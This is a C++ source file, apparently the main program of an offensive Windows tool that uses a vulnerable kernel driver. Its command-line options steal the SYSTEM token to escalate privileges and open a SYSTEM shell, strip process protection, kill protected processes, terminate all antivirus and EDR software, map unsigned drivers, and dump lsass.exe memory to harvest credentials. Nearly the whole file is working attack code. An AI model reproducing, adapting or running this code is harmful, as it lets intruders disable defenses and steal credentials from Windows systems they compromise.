#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <iostream>
#include <filesystem>
#include <tlhelp32.h>
#include <tchar.h>
#include "Log.hpp"
#include "Utils.hpp"
#include "MappingDriverBin.hpp"
#include "DriverLoader.h"
#include "DriverWorker.hpp"

#define NtCurrentProcess()				((HANDLE)(LONG_PTR)-1)
#define SystemHandleInformation			0x10
#define SystemHandleInformationSize		0x400000
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif // !STATUS_INFO_LENGTH_MISMATCH

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT	UniqueProcessId;
	USHORT	CreatorBackTraceIndex;
	UCHAR	ObjectTypeIndex;
	UCHAR	HandleAttributes;
	USHORT	HandleValue;
	PVOID	Object;
	ULONG	GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


typedef
NTSTATUS(__stdcall* pfnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS,
	PVOID,
	ULONG,
	PULONG);
pfnNtQuerySystemInformation pNtQuerySystemInformation;

typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW);

DWORD GetWindowsBuildNumber()
{
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		return 0;
	}

	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
	if (!RtlGetVersion)
	{
		LOG("[-] Failed to get RtlGetVersion address. Error code: " << std::hex << GetLastError() << std::dec);
		return 0;
	}

	RTL_OSVERSIONINFOW osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(osvi);

	if (NT_SUCCESS(RtlGetVersion(&osvi)))
	{
		LOG("[+] Windows Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
			<< " Build: " << osvi.dwBuildNumber << std::endl);
		return osvi.dwBuildNumber;
	}
	return 0;
}

static
int
InitFunc()
{
	HMODULE hModule = GetModuleHandle(L"ntdll.dll");

	if (hModule)
	{
		pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
		if (!pNtQuerySystemInformation)
		{
			printf("[-] NtQuerySystemInformation not loaded\n");
			return 1;
		}
	}

	return 0;
}

static
int
GetObjectPointer(
	PULONG64 ppObjAddr,
	ULONG ulPid,
	HANDLE handle)
{
	int Ret{ -1 };
	PSYSTEM_HANDLE_INFORMATION pHandleInfo{};
	ULONG		ulBytes{};
	NTSTATUS	Status{ STATUS_SUCCESS };

	while ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
		pHandleInfo,
		ulBytes,
		&ulBytes)) == 0xC0000004L)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				pHandleInfo,
				(size_t)2 * ulBytes);
		}
		else
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				(size_t)2 * ulBytes);
		}
	}

	if (Status != NULL)
	{
		Ret = Status;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) &&
			(pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(HandleToULong(handle))))
		{
			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
			Ret = 0;
			break;
		}
	}

done:

	if (pHandleInfo)
	{
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}


	return Ret;
}

static
DWORD 
GetLsassPid()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	DWORD lsassPid = 0;

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			if (_tcsicmp(pe32.szExeFile, _T("lsass.exe")) == 0)
			{
				lsassPid = pe32.th32ProcessID;
				break; 
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return lsassPid;
}

// 核心派生新进程函数
BOOL SpawnSystemCmd()
{
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	si.lpTitle = (LPSTR)"NT AUTHORITY\\SYSTEM (Permanent Shell)";

	BOOL success = CreateProcessA(
		"C:\\Windows\\System32\\cmd.exe", 
		NULL,                             
		NULL,                             
		NULL,                             
		FALSE,                            
		CREATE_NEW_CONSOLE,               // 弹出独立控制台黑窗口
		NULL,                             
		NULL,                             
		&si,                              
		&pi                               
	);

	if (success)
	{
		LOG("[+] Successfully spawned independent SYSTEM cmd window!");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return TRUE;
	}
	else
	{
		LOG("[-] Failed to spawn new cmd window. Error code: " << GetLastError());
		return FALSE;
	}
}

int main(int argc, char** argv)
{
	// ----------------- 核心修复：强制设置控制台输出编码为 UTF-8 -----------------
	// 这允许直接在 GitHub 网页端编辑并保留中文，而不会在 Windows 本地运行时发生任何乱码
	SetConsoleOutputCP(65001);
	// -------------------------------------------------------------------------

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink


	DWORD EPROCESS_TOKEN_OFFSET = 0;
	DWORD ProtectionOffset		= 0;
	DWORD SignatureLevelOffset	= 0;
	DWORD buildNumber = GetWindowsBuildNumber();
	if (buildNumber >= 26100)
	{
		EPROCESS_TOKEN_OFFSET = 0x248;
		ProtectionOffset = 0X5FA;
		SignatureLevelOffset = 0x5F8;
	}
	else if (buildNumber >= 19041)
	{
		EPROCESS_TOKEN_OFFSET = 0x4B8;
		ProtectionOffset = 0X87A;
		SignatureLevelOffset = 0x878;
	}
	else if (buildNumber >= 18362)
	{
		EPROCESS_TOKEN_OFFSET = 0x360;
		ProtectionOffset = 0X6FA;
		SignatureLevelOffset = 0x6F8;
	}
	else if (buildNumber >= 15063)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
		ProtectionOffset = 0X6CA;
		SignatureLevelOffset = 0x6C8;
	}
	else if (buildNumber >= 14393)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
		ProtectionOffset = 0X62; 
		SignatureLevelOffset = 0x6C0;
	}
	else
	{
		return -1;
	}

	constexpr std::string_view art = R"(
$$$$$$$\   $$\                                                   $$$$$$$$\          $$\  $$\ 
$$  __$$\  \__|                                                  $$  _____|         \__| $$ |
$$ |  $$ | $$\  $$$$$$$\    $$$$$$\    $$$$$$\   $$\   $$\       $$ |   $$\    $$\  $$\  $$ |
$$$$$$$\ | $$ | $$  __$$\   \____$$\  $$  __$$\  $$ |  $$ |      $$$$$$ \$$\  $$  | $$ | $$ |
$$  __$$\  $$ | $$ |  $$ |  $$$$$$$ | $$ |  \__| $$ |  $$ |      $$  ___ \$$\$$  /  $$ | $$ |
$$ |  $$ | $$ | $$ |  $$ | $$  __$$ | $$ |       $$ |  $$ |      $$ |     \$$$  /   $$ | $$ |
$$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /    $$ | $$ |
\_______/  \__| \__|  \__|  \_______| \__|        \____$$ |      \_________ \_/     \__| \__|
                                                 $$\   $$ |                              
                                                 \$$$$$$  |                              
                                                  \______/                               
	)";

	LOG(art);

	SetConsoleTextAttribute(hConsole, 7);

	if (InitFunc() != 0)
	{
		LOG("[-] Failed to initialize function pointers");
		return 1;
	}

	if (!Utils::InitSyscalls())
	{
		LOG("[-] Failed to initialize syscalls");
		return 1;
	}


	NTSTATUS status = Utils::RtlAdjustPrivilege(20);
	if (!NT_SUCCESS(status))
	{
		LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
		return 1;
	}

	BOOLEAN bOprOfPPL{ FALSE };
	BOOLEAN bAdd{ FALSE };	// true add false remove
	BOOLEAN bPrivilegeEscalation{ FALSE };
	BOOLEAN bKillProcess{ FALSE };
	BOOLEAN bKillAllAvs{ FALSE };

	BOOLEAN bDumpLsass{ FALSE };
	ULONG nTargetPid{ 0 };

	BOOLEAN bMapping{ FALSE };
	std::string strMappingDriver;

	// parse command line
	for (size_t i = 1; i < argc; i++)
	{
		std::string arg = argv[i];

		if (arg == "--ppl" || arg == "--PPL")
		{
			bOprOfPPL = TRUE;
		}

		else if (arg == "-add" || arg == "-a" || arg == "-ADD" || arg == "-A")
		{
			if (i + 1 < argc)   
			{
				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
			}
			bAdd = TRUE;
		}

		else if (arg == "-rve" || arg == "-r" || arg == "-RVE" || arg == "-R")
		{
			if (i + 1 < argc)   
			{
				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
			}
			bAdd = FALSE;
		}

		else if (arg == "--PriEsc" || arg == "--PS")
		{
			if (i + 1 < argc && argv[i + 1][0] != '-')   
			{
				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
			}

			bPrivilegeEscalation = TRUE;
		}

		else if (arg == "--KillProcess" || arg == "--k" || arg == "--K" || arg == "-k" || arg == "-K")
		{
			if (i + 1 < argc)   
			{
				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
			}

			bKillProcess = TRUE;
		}
		else if (arg == "--ka" || arg == "--KA")
		{
			bKillAllAvs = TRUE;
		}

		else if (arg == "--map" || 
			arg == "--m" || 
			arg == "--M" ||
			arg == "-m"||
			arg == "-M")
		{
			if (i + 1 < argc)
			{
				strMappingDriver = argv[++i];
			}

			bMapping = TRUE;
		}

		else if (arg == "--dmp")
		{
			bDumpLsass = TRUE;
		}

		else if (arg == "-h" || arg == "--help")
		{
			// ----------------- 彻底重写：干净不乱码的中文帮助菜单 -----------------
			SetConsoleTextAttribute(hConsole, 13);  
			std::cout << "用法:\n"
				<< "  --ppl -add <PID>      提升目标进程为 PPL 保护\n"
				<< "  --ppl -rve <PID>      剥离并移除目标进程的 PPL 保护\n"
				<< "  --PriEsc <PID>        底层权限提升 (如果不带 PID，默认新开 SYSTEM 控制台)\n"
				<< "  --KillProcess <PID>   无视保护强杀目标进程\n"
				<< "  --KA                  一键终结已知的所有反病毒软件及进程\n"
				<< "  --map <文件路径>       利用脆弱驱动 Manual Map 映射第三方驱动文件\n"
				<< "  --dmp                 绕过 PPL 并直接内存转储导出 lsass.exe\n";
			SetConsoleTextAttribute(hConsole, 7);
			return 0;
		}
	}


	ULONG64 SystemProcess{ 0 };
	ULONG64 TargetProcess{ 0 };

	if (bOprOfPPL || bPrivilegeEscalation)
	{
		auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
		if (nResult != 0 || SystemProcess == 0)
		{
			LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
			return nResult;
		}

		if (nTargetPid == 0)
		{
			nTargetPid = GetCurrentProcessId();
		}
		
		auto hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nTargetPid);
		if (!hTargetProcess)
		{
			hTargetProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, nTargetPid);
		}
		
		nResult = GetObjectPointer(&TargetProcess, nTargetPid, hTargetProcess);
		if (nResult != 0 || TargetProcess == 0)
		{
			LOG("[-] GetObjectPtr failed for target process with error code: " << nResult);
			if (hTargetProcess) CloseHandle(hTargetProcess);
			return nResult;
		}
		if (hTargetProcess) CloseHandle(hTargetProcess);
	}

	auto initResult = DriverWorker::InitializeDriver();
	if (!initResult)
	{
		LOG("[-] Failed to initialize driver");
		return 1;
	}

	BOOLEAN bInitKiller{ FALSE };
	if (bKillAllAvs || bKillProcess)
	{
		bInitKiller = DriverWorker::KillerInit();
	}

	if (bOprOfPPL && bAdd)
	{
		DriverLoader::PS_PROTECTION protection{};
		protection.Type		= DriverLoader::PsProtectedTypeProtected;
		protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;

		DriverLoader::SetProcessProtection(TargetProcess, ProtectionOffset, &protection);
	}
	else if (bOprOfPPL && !bAdd)
	{
		DriverLoader::PS_PROTECTION protection{};
		protection.Level = 0;

		DriverLoader::SetProcessProtection(TargetProcess, ProtectionOffset, &protection);
	}
	else if (bPrivilegeEscalation)
	{
		SetConsoleTextAttribute(hConsole, 9);	// Bright Blue
		if (DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET))
		{
			std::wcout << L"[+] Privilege Escalation Successful! nt_authority\\system" << std::endl;
			
			// 成功替换 Token 后，无阻塞秒弹高权限 Shell 窗口
			SpawnSystemCmd();
		}
		SetConsoleTextAttribute(hConsole, 7);
	}
	else if (bInitKiller && bKillProcess)
	{
		DriverWorker::Kill(nTargetPid);
	}
	else if (bInitKiller && bKillAllAvs)
	{
		DriverLoader::KillAllAvOrEdr();
	}
	else if (bMapping)
	{
		if (strMappingDriver.empty())
		{
			do
			{
				auto initMemoryResult = DriverLoader::InitMemoryManager();
				if (!initMemoryResult)
				{
					LOG("[-] Failed to initialize memory manager");
					break;
				}

				SetConsoleTextAttribute(hConsole, 13);  
				DriverLoader::MapperDriver(Mapper::hexData);
				SetConsoleTextAttribute(hConsole, 7);

			} while (FALSE);
		}
		else
		{
			do
			{
				auto initMemoryResult = DriverLoader::InitMemoryManager();
				if (!initMemoryResult)
				{
					LOG("[-] Failed to initialize memory manager");
					break;
				}

				SetConsoleTextAttribute(hConsole, 13);  
				DriverLoader::MapperDriver(strMappingDriver);
				SetConsoleTextAttribute(hConsole, 7);

			} while (FALSE);
		}
	}
	else if (bDumpLsass)
	{
		do 
		{
			DWORD dwPid = GetLsassPid();
			if (!dwPid)
			{
				LOG("GetLsassPid failed line :" << __LINE__);
				break;
			}
			
			auto hTmpProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
			if (!hTmpProcess)
			{
				hTmpProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
				if (!hTmpProcess)
				{
					LOG("Open Tmp Process failed" << GetLastError());
					break;
				}
			}

			ULONG64 processObject{};
			auto result = GetObjectPointer(&processObject, dwPid, hTmpProcess);
			if (!processObject)
			{
				LOG("GetObjectPointer failed!!!");
				CloseHandle(hTmpProcess);
				break;
			}
			CloseHandle(hTmpProcess);

			auto backupProtection = DriverLoader::GetProcessProtection(processObject, ProtectionOffset);

			DriverLoader::PS_PROTECTION protection{0};
			
			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &protection);
			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 1, &protection);
			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 2, &protection);

			auto hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
			if (!hProcess)
			{
				LOG("PROCESS_QUERY_INFORMATION | PROCESS_VM_READ FAILED code " << GetLastError());
				break;
			}

			auto currentPath = std::filesystem::current_path();
			std::string strDumpFileName = "dumpLsass_" + std::to_string(std::time(nullptr));
			auto fullPath = currentPath / strDumpFileName;
			fullPath.replace_extension(".dmp");

			std::string dumpFile = fullPath.string();

			HANDLE hFile = CreateFileA(dumpFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (INVALID_HANDLE_VALUE == hFile)
			{
				LOG("CreateFileA Failed!!!");
				CloseHandle(hProcess);
				break;
			}

			if (DriverLoader::DumpLsass(hProcess, dwPid, hFile))
			{
				LOG("[+] Lsass Dump successfully saved to: " << dumpFile);
			}
			else
			{
				LOG("DumpLsass Failed!!!");
			}
			
			CloseHandle(hFile);
			CloseHandle(hProcess);

			DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &backupProtection);

		} while (FALSE);
	}
	
	DriverWorker::UninitializeDriver();
	return 0;
}
